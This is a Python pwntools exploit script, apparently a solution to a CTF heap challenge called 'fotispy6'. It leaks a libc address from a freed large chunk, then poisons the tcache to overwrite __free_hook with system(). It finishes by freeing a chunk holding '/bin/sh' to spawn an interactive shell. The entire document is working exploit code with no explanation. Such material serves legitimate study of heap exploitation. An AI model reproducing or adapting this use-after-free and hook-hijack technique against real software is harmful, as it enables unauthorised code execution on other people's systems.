#!/usr/bin/env python3

from pwn import *

exe = ELF("./fotispy6_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.31.so", checksec=False)

context.binary = exe


if args.LOCAL:
    p = process([exe.path], aslr=False)
else:
    p = remote("addr", 1337)

def addsong(size, data):
    p.sendlineafter(b'Choice: ', str(2))
    p.sendlineafter(b'be: ', str(size))
    p.sendlineafter(b'comment: ', data)

def edit(idx, size, data):
    p.sendlineafter(b'Choice: ', str(3))
    p.sendlineafter(b'select: ', str(idx))
    p.sendlineafter(b'be: ', str(size))
    p.sendlineafter(b'comment: ', data)

def show(idx):
    p.sendlineafter(b'Choice: ', str(4))
    p.sendlineafter(b'select: ', str(idx))

def delete(idx):
    p.sendlineafter(b'Choice: ', str(5))
    p.sendlineafter(b'select: ', str(idx))

input()

#leak libc
addsong(0x420, b'abcd') # 0
addsong(0x10, b'abcd') # 1

delete(0)
show(0)
p.recvuntil(b'comment:\n')
libc_leak = u64(p.recvline()[:-1] + b'\0\0')
libc.address = libc_leak - 0x1ecbe0
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]
# tcache poisioning
addsong(0x420, b'abcd') # 2
addsong(0x32, b'abcd') # 3
addsong(0x32, b'abcd') # 4

delete(4)
delete(3)

edit(3, 8, p64(libc.sym.__free_hook))
delete(4)
addsong(0x32, b'abcd') # 5
edit(5, 8, b'/bin/sh\0')
addsong(0x32, b'abcd') # 6
addsong(0x32, p64(libc.sym.system)) # 7

# system("/bin/sh")
delete(5)

p.interactive()